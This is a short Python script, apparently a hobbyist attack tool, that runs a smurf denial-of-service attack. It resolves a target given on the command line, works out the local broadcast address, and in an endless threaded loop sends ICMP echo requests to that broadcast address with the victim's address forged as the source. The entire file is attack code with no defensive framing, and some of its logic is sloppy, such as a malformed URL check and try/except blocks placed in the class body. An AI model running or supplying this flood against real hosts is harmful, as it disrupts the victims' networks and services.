#!/usr/bin/env python
#author Aiden

from scapy.all import *
import socket, sys,re ,threading
from subprocess import check_output

if len(sys.argv) != 2:
	print "Usage: smurf.py <target>"
	sys.exit(1) 
victim = sys.argv[1]
sys.tracebacklimit=0

class smurf(threading.Thread):
	try:
		def check(self):
			global target,victim,broadcast
			rep = victim.replace('.','')
			check = rep.isdigit()
			if check == True:
				target = victim 
			elif check == False and 'http'or'https' in victim:
				if victim.count("/")==2:
					victim = victim + "/"
				m = re.search('(https?\://)?([^/]*)/?.*', victim)
				host = m.group(2)
				target = socket.gethostbyname(host)

			ipconfig = check_output(['ipconfig'])
			getip = ipconfig.split()[34]
			net = getip.split('.')
			dot = '.'
			broadcast = net[0] + dot + net[1]+ dot + net[2] + dot + '255'
		def run(self):
			self.check()
			ip_header = IP(src=target ,dst=broadcast)
			packet = ip_header/ICMP(type=8,code=0)
			send(packet)

	except KeyboardInterrupt:
		sys.exit(1)
	except:
		print 'Victim not available or there is some error with your IP!'
		sys.exit(1)
total = 0
while True:
	smurf().start()
	total += 1
	sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
